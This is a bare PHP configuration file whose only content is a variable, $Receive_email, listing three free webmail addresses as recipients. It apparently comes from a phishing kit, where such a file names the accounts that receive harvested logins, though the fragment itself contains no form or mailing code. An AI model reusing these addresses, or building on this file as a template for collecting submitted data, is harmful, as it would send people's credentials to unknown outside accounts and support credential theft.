<?php 
$Receive_email="dodomefaso@yandex.com,ezenwadije01@gmail.com,sparoon@yandex.com";
?>